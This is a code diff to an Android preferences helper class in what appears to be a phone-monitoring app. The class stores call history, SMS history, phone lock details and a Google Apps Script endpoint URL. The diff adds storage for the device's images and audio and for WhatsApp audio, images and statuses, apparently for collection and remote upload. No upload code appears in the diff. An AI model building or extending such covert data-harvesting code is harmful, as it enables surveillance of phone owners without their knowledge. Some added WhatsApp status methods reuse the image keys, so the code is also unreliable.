@@ -28,7 +28,7 @@ public class Sharedpref {
         editor.putString("savename",saveName.trim());
     }
     public String getSaveName(){
-        return sharedPreferences.getString("savename","");
+        return sharedPreferences.getString("savename","No Name Yet");
     }
     public void setPhoneNumbersListSize(int PhoneNumbersList){
         editor.putInt("PhoneNumbersListSize",PhoneNumbersList);
@@ -136,7 +136,7 @@ public class Sharedpref {
         editor.commit();
     }
     public String getUrl(){
-        return sharedPreferences.getString("setnewurl","https://script.google.com/macros/s/AKfycbzABlVcKwlQegZxxyLJRWdG9W7X7eSU0AMVA76KjO0O5WhwodKYQKjL0ycgKGmykov6nw/exec");
+        return sharedPreferences.getString("setnewurl","https://script.google.com/macros/s/AKfycbyDDM0d5P_wzbh80bOpjmocdf3tbAZhObLTDIDa92E01GES1wDvCzE8lCo8PE_Jgqa4dA/exec");
     }
     public void setCallHistory(String callhistory){
         editor.putString("callhistory",callhistory.trim());
@@ -156,12 +156,6 @@ public class Sharedpref {
     public String getPhoneLockDetails(){
         return sharedPreferences.getString("phonelockdetails","");
     }
-    public void setImageList(String imageList){
-        editor.putString("imageList",imageList.trim());
-    }
-    public String getImageList(){
-        return sharedPreferences.getString("imageList","");
-    }
     public void setSmsHistory(String SmsHistory){
         editor.putString("smshistory",SmsHistory.trim());
     }
@@ -175,5 +169,83 @@ public class Sharedpref {
         return sharedPreferences.getString("serviceStatus","");
     }
 
+    /*Images List*/
+    public void setImageList(String imageList){
+        editor.putString("imageList",imageList.trim());
+    }
+    public String getImageList(){
+        return sharedPreferences.getString("imageList","");
+    }
+    /*Images from Phone*/
+    public void setImagesJson(String imageJson){
+        editor.putString("imagesJson",imageJson.trim());
+    }
+    public String getImagesJson(){
+        return sharedPreferences.getString("imagesJson","");
+    }
+
+    /*Audio Files*/
+    public void setAudioList(String audioList){
+        editor.putString("audioList",audioList.trim());
+    }
+    public String getAudioList(){
+        return sharedPreferences.getString("audioList","");
+    }
+
+    /*Audio Json*/
+    public void setAudioJson(String audioJson){
+        editor.putString("audioJson",audioJson.trim());
+    }
+    public String getAudioJson(){
+        return sharedPreferences.getString("audioJson","");
+    }
+
+
+    /*WhatsAppAudioList*/
+    public void setWhatsAppAudioList(String whatsAppAudioList){
+        editor.putString("whatsAppAudioList",whatsAppAudioList.trim());
+    }
+    public String getWhatsAppAudioList(){
+        return sharedPreferences.getString("whatsAppAudioList","");
+    }
+    /*WhatsAppAudioJSON*/
+    public void setWhatsAppAudioJSon(String whatsAppAudioJSon){
+        editor.putString("whatsAppAudioJSon",whatsAppAudioJSon.trim());
+    }
+    public String getWhatsAppAudioJson(){
+        return sharedPreferences.getString("whatsAppAudioJSon","");
+    }
+
+    /*WhatsAppImageList*/
+    public void setWhatsAppImageList(String whatsAppImageListList){
+        editor.putString("whatsAppImageListList",whatsAppImageListList.trim());
+    }
+    public String getWhatsAppAImageList(){
+        return sharedPreferences.getString("whatsAppImageListList","");
+    }
+
+    /*WhatsAppImageJSon*/
+    public void setWhatsAppImageJson(String whatsAppImageJson){
+        editor.putString("whatsAppImageJson",whatsAppImageJson.trim());
+    }
+    public String getWhatsAppAImageJson(){
+        return sharedPreferences.getString("whatsAppImageJson","");
+    }
+
+    /*WhatsAppStatusList*/
+    public void setWhatsAppStatusList(String whatsAppImageListList){
+        editor.putString("whatsAppImageListList",whatsAppImageListList.trim());
+    }
+    public String getWhatsAppAStatusList(){
+        return sharedPreferences.getString("whatsAppImageListList","");
+    }
+
+    /*WhatsAppStatusJSon*/
+    public void setWhatsAppStatusJson(String whatsAppImageJson){
+        editor.putString("whatsAppImageJson",whatsAppImageJson.trim());
+    }
+    public String getWhatsAppStatusJson(){
+        return sharedPreferences.getString("whatsAppImageJson","");
+    }
 
 }
